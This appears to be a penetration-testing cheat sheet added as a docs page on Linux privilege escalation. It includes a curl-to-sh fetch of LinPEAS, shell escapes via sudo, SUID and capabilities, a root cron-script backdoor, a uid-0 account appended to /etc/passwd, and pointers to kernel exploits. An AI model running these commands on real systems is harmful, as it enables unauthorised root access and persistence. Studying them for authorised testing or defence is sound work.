@@ -1,0 +1,98 @@
+---
+title: "Linux Privilege Escalation"
+description: "Common Linux privilege escalation techniques — from enumeration to root."
+---
+
+## Automated Enumeration
+
+Always run an automated script first to get a lay of the land.
+
+```bash
+# LinPEAS - comprehensive enum
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# LinEnum
+./LinEnum.sh
+
+# linux-smart-enumeration
+./lse.sh -l 2
+```
+
+## Sudo Misconfigurations
+
+```bash
+# Check sudo permissions
+sudo -l
+
+# If a binary is listed → check GTFOBins
+# Example: sudo find
+sudo find . -exec /bin/sh \; -quit
+
+# sudo vim → :!/bin/bash
+# sudo python → import os; os.system('/bin/bash')
+```
+
+## SUID Binaries
+
+```bash
+# Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Check against GTFOBins
+# Example: /usr/bin/find with SUID
+find . -exec /bin/sh -p \; -quit
+```
+
+## Cron Jobs
+
+```bash
+# View cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# Look for writable scripts run by root
+# If /etc/cron.d/backup runs /opt/backup.sh → overwrite it
+echo "chmod +s /bin/bash" >> /opt/backup.sh
+# Wait for cron to run, then:
+bash -p
+```
+
+## Writable /etc/passwd
+
+```bash
+# Generate password hash
+openssl passwd -1 -salt abc password123
+
+# Append new root user
+echo 'hacker:$1$abc$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacker
+```
+
+## Capabilities
+
+```bash
+# Find binaries with capabilities
+getcap -r / 2>/dev/null
+
+# Example: python3 with cap_setuid
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+## Kernel Exploits
+
+```bash
+# Get kernel version
+uname -a
+cat /proc/version
+
+# Search for exploits
+searchsploit linux kernel 4.4
+
+# Common: DirtyCow (CVE-2016-5195)
+# Common: PwnKit (CVE-2021-4034)
+```
+
+<Tip>
+  Always try manual vectors before jumping to kernel exploits — they can crash the system.
+</Tip>
